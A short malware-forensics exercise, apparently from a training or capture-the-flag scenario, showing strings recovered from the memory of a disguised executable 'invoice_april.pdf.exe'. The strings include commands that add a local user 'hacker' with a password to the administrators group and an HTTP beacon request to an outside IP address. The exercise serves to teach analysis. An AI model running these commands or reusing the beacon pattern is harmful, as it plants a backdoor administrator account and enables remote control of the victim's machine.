## String Extraction

You dump the memory of a suspicious process and run `strings` against it. Among the output, you find the following lines:

```
cmd.exe /c whoami
cmd.exe /c net user hacker P@ssw0rd! /add
cmd.exe /c net localgroup administrators hacker /add
Mozilla/5.0 (Windows NT 10.0; Win64; x64)
GET /beacon HTTP/1.1
Host: 185.220.101.47
```

The process that owns this memory region is `invoice_april.pdf.exe`.
